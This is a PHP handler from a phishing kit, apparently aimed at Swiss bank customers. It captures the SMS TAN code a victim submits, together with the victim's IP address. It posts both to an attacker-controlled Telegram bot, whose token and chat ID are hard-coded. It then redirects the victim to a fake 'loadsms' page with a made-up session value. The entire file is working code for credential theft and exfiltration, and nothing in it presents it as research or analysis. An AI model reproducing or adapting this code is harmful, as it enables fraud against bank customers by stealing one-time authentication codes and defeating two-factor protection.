<?php
$sms = $_POST['tan'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

 
$subject = "TAN CODE | :   :) <3 : from: ".$ip;
$nome="TAN SPOWWW " ; 
	$from="frt@huzrt.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ ✔️ SMS - RECIEVED ✔️ +-----------------\r\n";
$message .= "SMS CODE : ".$sms."\r\n";
$message .= "---------------+ 🍬 IP VICTIME 🍬 +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 🇨🇭 SAMALAPA 🇨🇭  +------------------\r\n";



 	$website="https://api.telegram.org/bot7639257483:AAH5zhtEQX43-rlQs8giyoyMZMUfaFvdGwk";
    $params=[
        'chat_id'=>'1514201446',
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = '../loadsms.html?cmd=_informations&session=".$x.$xx."';   </script>";

?>